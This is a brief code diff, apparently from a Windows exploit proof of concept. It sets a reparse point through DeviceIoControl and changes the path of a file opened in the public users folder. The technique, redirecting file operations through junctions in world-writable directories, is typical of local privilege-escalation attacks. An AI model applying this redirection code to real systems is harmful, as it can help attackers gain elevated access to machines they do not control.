@@ -141,7 +141,7 @@ int main() {
 	DeviceIoControl(h, FSCTL_SET_REPARSE_POINT, buffer, 0x2c, 0, 0, &dw, 0);
 	CloseHandle(h);
 
-	h = CreateFileA("C:\\Users\\Public\\Recorded\\TempRec",
+	h = CreateFileA("C:\\Users\\Public\\1",
 		GENERIC_READ | (1 ? GENERIC_WRITE : 0),
 		FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
 		0,
